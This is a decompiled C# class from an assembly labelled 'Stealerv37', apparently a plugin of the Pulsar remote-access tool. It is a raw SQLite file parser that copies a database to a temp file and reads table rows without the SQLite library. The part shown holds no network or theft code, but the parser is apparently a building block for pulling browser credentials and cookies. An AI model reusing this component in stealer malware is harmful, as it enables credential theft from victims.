// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Sql.SqLite
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.IO;
using System.Text;

#nullable disable
namespace Intelix.Helper.Sql;

public class SqLite
{
  private readonly ulong _dbEncoding;
  private readonly byte[] _fileBytes;
  private readonly ulong _pageSize;
  private readonly byte[] _sqlDataTypeSize = new byte[10]
  {
    (byte) 0,
    (byte) 1,
    (byte) 2,
    (byte) 3,
    (byte) 4,
    (byte) 6,
    (byte) 8,
    (byte) 8,
    (byte) 0,
    (byte) 0
  };
  private string[] _fieldNames;
  private SqLite.SqliteMasterEntry[] _masterTableEntries;
  private SqLite.TableEntry[] _tableEntries;

  public SqLite(string fileName)
  {
    this._fileBytes = File.ReadAllBytes(fileName);
    this._pageSize = this.ConvertToULong(16 /*0x10*/, 2);
    this._dbEncoding = this.ConvertToULong(56, 4);
    this.ReadMasterTable(100L);
  }

  public SqLite(byte[] basedata)
  {
    this._fileBytes = basedata;
    this._pageSize = this.ConvertToULong(16 /*0x10*/, 2);
    this._dbEncoding = this.ConvertToULong(56, 4);
    this.ReadMasterTable(100L);
  }

  public string GetValue(int rowNum, int field)
  {
    try
    {
      return rowNum >= this._tableEntries.Length ? (string) null : (field >= this._tableEntries[rowNum].Content.Length ? (string) null : this._tableEntries[rowNum].Content[field]);
    }
    catch
    {
      return "";
    }
  }

  public int GetRowCount() => this._tableEntries.Length;

  private bool ReadTableFromOffset(ulong offset)
  {
    try
    {
      switch (this._fileBytes[offset])
      {
        case 5:
          uint num1 = (uint) (this.ConvertToULong((int) ((long) offset + 3L), 2) - 1UL);
          for (uint index = 0; (int) index <= (int) num1; ++index)
          {
            uint num2 = (uint) this.ConvertToULong((int) offset + 12 + (int) index * 2, 2);
            this.ReadTableFromOffset((this.ConvertToULong((int) ((long) offset + (long) num2), 4) - 1UL) * this._pageSize);
          }
          this.ReadTableFromOffset((this.ConvertToULong((int) ((long) offset + 8L), 4) - 1UL) * this._pageSize);
          break;
        case 13:
          uint num3 = (uint) (this.ConvertToULong((int) offset + 3, 2) - 1UL);
          int num4 = 0;
          if (this._tableEntries != null)
          {
            num4 = this._tableEntries.Length;
            Array.Resize<SqLite.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int) num3 + 1);
          }
          else
            this._tableEntries = new SqLite.TableEntry[(int) num3 + 1];
          for (uint index1 = 0; (int) index1 <= (int) num3; ++index1)
          {
            ulong startIdx1 = this.ConvertToULong((int) offset + 8 + (int) index1 * 2, 2);
            if (offset != 100UL)
              startIdx1 += offset;
            int endIdx1 = this.Gvl((int) startIdx1);
            this.Cvl((int) startIdx1, endIdx1);
            int endIdx2 = this.Gvl((int) ((long) startIdx1 + ((long) endIdx1 - (long) startIdx1) + 1L));
            this.Cvl((int) ((long) startIdx1 + ((long) endIdx1 - (long) startIdx1) + 1L), endIdx2);
            ulong startIdx2 = startIdx1 + (ulong) ((long) endIdx2 - (long) startIdx1 + 1L);
            int endIdx3 = this.Gvl((int) startIdx2);
            int endIdx4 = endIdx3;
            long num5 = this.Cvl((int) startIdx2, endIdx3);
            SqLite.RecordHeaderField[] array = (SqLite.RecordHeaderField[]) null;
            long num6 = (long) startIdx2 - (long) endIdx3 + 1L;
            int index2 = 0;
            while (num6 < num5)
            {
              Array.Resize<SqLite.RecordHeaderField>(ref array, index2 + 1);
              int startIdx3 = endIdx4 + 1;
              endIdx4 = this.Gvl(startIdx3);
              array[index2].Type = this.Cvl(startIdx3, endIdx4);
              array[index2].Size = array[index2].Type <= 9L ? (long) this._sqlDataTypeSize[array[index2].Type] : (!SqLite.IsOdd(array[index2].Type) ? (array[index2].Type - 12L) / 2L : (array[index2].Type - 13L) / 2L);
              num6 = num6 + (long) (endIdx4 - startIdx3) + 1L;
              ++index2;
            }
            if (array != null)
            {
              this._tableEntries[num4 + (int) index1].Content = new string[array.Length];
              int num7 = 0;
              for (int index3 = 0; index3 <= array.Length - 1; ++index3)
              {
                if (array[index3].Type > 9L)
                {
                  if (!SqLite.IsOdd(array[index3].Type))
                  {
                    long num8 = (long) this._dbEncoding - 1L;
                    switch (num8)
                    {
                      case 0:
                      case 1:
                      case 2:
                        switch (num8)
                        {
                          case 0:
                            this._tableEntries[num4 + (int) index1].Content[index3] = Encoding.Default.GetString(this._fileBytes, (int) ((long) startIdx2 + num5 + (long) num7), (int) array[index3].Size);
                            break;
                          case 1:
                            this._tableEntries[num4 + (int) index1].Content[index3] = Encoding.Unicode.GetString(this._fileBytes, (int) ((long) startIdx2 + num5 + (long) num7), (int) array[index3].Size);
                            break;
                          case 2:
                            this._tableEntries[num4 + (int) index1].Content[index3] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int) ((long) startIdx2 + num5 + (long) num7), (int) array[index3].Size);
                            break;
                        }
                        break;
                    }
                  }
                  else
                    this._tableEntries[num4 + (int) index1].Content[index3] = Encoding.Default.GetString(this._fileBytes, (int) ((long) startIdx2 + num5 + (long) num7), (int) array[index3].Size);
                }
                else
                  this._tableEntries[num4 + (int) index1].Content[index3] = Convert.ToString(this.ConvertToULong((int) ((long) startIdx2 + num5 + (long) num7), (int) array[index3].Size));
                num7 += (int) array[index3].Size;
              }
            }
          }
          break;
      }
      return true;
    }
    catch
    {
      return false;
    }
  }

  private void ReadMasterTable(long offset)
  {
    while (true)
    {
      switch (this._fileBytes[offset])
      {
        case 5:
          uint num1 = (uint) (this.ConvertToULong((int) offset + 3, 2) - 1UL);
          for (int index = 0; index <= (int) num1; ++index)
          {
            uint startIndex = (uint) this.ConvertToULong((int) offset + 12 + index * 2, 2);
            if (offset == 100L)
              this.ReadMasterTable(((long) this.ConvertToULong((int) startIndex, 4) - 1L) * (long) this._pageSize);
            else
              this.ReadMasterTable(((long) this.ConvertToULong((int) (offset + (long) startIndex), 4) - 1L) * (long) this._pageSize);
          }
          offset = ((long) this.ConvertToULong((int) offset + 8, 4) - 1L) * (long) this._pageSize;
          continue;
        case 13:
          goto label_8;
        default:
          goto label_25;
      }
    }
label_25:
    return;
label_8:
    ulong num2 = this.ConvertToULong((int) offset + 3, 2) - 1UL;
    int num3 = 0;
    if (this._masterTableEntries != null)
    {
      num3 = this._masterTableEntries.Length;
      Array.Resize<SqLite.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int) num2 + 1);
    }
    else
      this._masterTableEntries = new SqLite.SqliteMasterEntry[checked ((ulong) unchecked ((long) num2 + 1L))];
    for (ulong index1 = 0; index1 <= num2; ++index1)
    {
      ulong startIdx1 = this.ConvertToULong((int) offset + 8 + (int) index1 * 2, 2);
      if (offset != 100L)
        startIdx1 += (ulong) offset;
      int endIdx1 = this.Gvl((int) startIdx1);
      this.Cvl((int) startIdx1, endIdx1);
      int endIdx2 = this.Gvl((int) ((long) startIdx1 + ((long) endIdx1 - (long) startIdx1) + 1L));
      this.Cvl((int) ((long) startIdx1 + ((long) endIdx1 - (long) startIdx1) + 1L), endIdx2);
      ulong startIdx2 = startIdx1 + (ulong) ((long) endIdx2 - (long) startIdx1 + 1L);
      int endIdx3 = this.Gvl((int) startIdx2);
      int endIdx4 = endIdx3;
      long num4 = this.Cvl((int) startIdx2, endIdx3);
      long[] numArray = new long[5];
      for (int index2 = 0; index2 <= 4; ++index2)
      {
        int startIdx3 = endIdx4 + 1;
        endIdx4 = this.Gvl(startIdx3);
        numArray[index2] = this.Cvl(startIdx3, endIdx4);
        numArray[index2] = numArray[index2] <= 9L ? (long) this._sqlDataTypeSize[numArray[index2]] : (!SqLite.IsOdd(numArray[index2]) ? (numArray[index2] - 12L) / 2L : (numArray[index2] - 13L) / 2L);
      }
      if (this._dbEncoding == 1UL || this._dbEncoding == 2UL)
      {
        long num5 = (long) this._dbEncoding - 1L;
        switch (num5)
        {
          case 0:
          case 1:
          case 2:
            switch (num5)
            {
              case 0:
                this._masterTableEntries[num3 + (int) index1].ItemName = Encoding.Default.GetString(this._fileBytes, (int) ((long) startIdx2 + num4 + numArray[0]), (int) numArray[1]);
                break;
              case 1:
                this._masterTableEntries[num3 + (int) index1].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int) ((long) startIdx2 + num4 + numArray[0]), (int) numArray[1]);
                break;
              case 2:
                this._masterTableEntries[num3 + (int) index1].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int) ((long) startIdx2 + num4 + numArray[0]), (int) numArray[1]);
                break;
            }
            break;
        }
      }
      this._masterTableEntries[num3 + (int) index1].RootNum = (long) this.ConvertToULong((int) ((long) startIdx2 + num4 + numArray[0] + numArray[1] + numArray[2]), (int) numArray[3]);
      long num6 = (long) this._dbEncoding - 1L;
      switch (num6)
      {
        case 0:
        case 1:
        case 2:
          switch (num6)
          {
            case 0:
              this._masterTableEntries[num3 + (int) index1].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int) ((long) startIdx2 + num4 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int) numArray[4]);
              continue;
            case 1:
              this._masterTableEntries[num3 + (int) index1].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int) ((long) startIdx2 + num4 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int) numArray[4]);
              continue;
            case 2:
              this._masterTableEntries[num3 + (int) index1].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int) ((long) startIdx2 + num4 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int) numArray[4]);
              continue;
            default:
              continue;
          }
      }
    }
  }

  public bool ReadTable(string tableName)
  {
    int index1 = -1;
    for (int index2 = 0; index2 <= this._masterTableEntries.Length; ++index2)
    {
      if (string.Compare(this._masterTableEntries[index2].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
      {
        index1 = index2;
        break;
      }
    }
    if (index1 == -1)
      return false;
    string[] strArray = this._masterTableEntries[index1].SqlStatement.Substring(this._masterTableEntries[index1].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
    for (int index3 = 0; index3 <= strArray.Length - 1; ++index3)
    {
      strArray[index3] = strArray[index3].TrimStart();
      int length = strArray[index3].IndexOf(' ');
      if (length > 0)
        strArray[index3] = strArray[index3].Substring(0, length);
      if (strArray[index3].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
      {
        Array.Resize<string>(ref this._fieldNames, index3 + 1);
        this._fieldNames[index3] = strArray[index3];
      }
    }
    return this.ReadTableFromOffset((ulong) (this._masterTableEntries[index1].RootNum - 1L) * this._pageSize);
  }

  private ulong ConvertToULong(int startIndex, int size)
  {
    try
    {
      if (size > 8 || size == 0)
        return 0;
      ulong num = 0;
      for (int index = 0; index <= size - 1; ++index)
        num = num << 8 | (ulong) this._fileBytes[startIndex + index];
      return num;
    }
    catch
    {
      return 0;
    }
  }

  private int Gvl(int startIdx)
  {
    try
    {
      if (startIdx > this._fileBytes.Length)
        return 0;
      for (int index = startIdx; index <= startIdx + 8; ++index)
      {
        if (index > this._fileBytes.Length - 1)
          return 0;
        if (((int) this._fileBytes[index] & 128 /*0x80*/) != 128 /*0x80*/)
          return index;
      }
      return startIdx + 8;
    }
    catch
    {
      return 0;
    }
  }

  private long Cvl(int startIdx, int endIdx)
  {
    try
    {
      ++endIdx;
      byte[] numArray = new byte[8];
      int num1 = endIdx - startIdx;
      bool flag = false;
      if (num1 == 0 || num1 > 9)
        return 0;
      switch (num1)
      {
        case 1:
          numArray[0] = (byte) ((uint) this._fileBytes[startIdx] & (uint) sbyte.MaxValue);
          return BitConverter.ToInt64(numArray, 0);
        case 9:
          flag = true;
          break;
      }
      int num2 = 1;
      int num3 = 7;
      int index1 = 0;
      if (flag)
      {
        numArray[0] = this._fileBytes[endIdx - 1];
        --endIdx;
        index1 = 1;
      }
      for (int index2 = endIdx - 1; index2 >= startIdx; index2 += -1)
      {
        if (index2 - 1 >= startIdx)
        {
          numArray[index1] = (byte) ((int) this._fileBytes[index2] >> num2 - 1 & (int) byte.MaxValue >> num2 | (int) this._fileBytes[index2 - 1] << num3);
          ++num2;
          ++index1;
          --num3;
        }
        else if (!flag)
          numArray[index1] = (byte) ((int) this._fileBytes[index2] >> num2 - 1 & (int) byte.MaxValue >> num2);
      }
      return BitConverter.ToInt64(numArray, 0);
    }
    catch
    {
      return 0;
    }
  }

  private static bool IsOdd(long value) => (value & 1L) == 1L;

  public static SqLite ReadTable(string database, string table)
  {
    try
    {
      string str = Path.GetTempFileName() + ".tmpdb";
      File.Copy(database, str);
      SqLite sqLite = new SqLite(str);
      sqLite.ReadTable(table);
      File.Delete(str);
      return sqLite.GetRowCount() == 65536 /*0x010000*/ ? (SqLite) null : sqLite;
    }
    catch
    {
      return (SqLite) null;
    }
  }

  private struct RecordHeaderField
  {
    public long Size;
    public long Type;
  }

  private struct TableEntry
  {
    public string[] Content;
  }

  private struct SqliteMasterEntry
  {
    public string ItemName;
    public long RootNum;
    public string SqlStatement;
  }
}
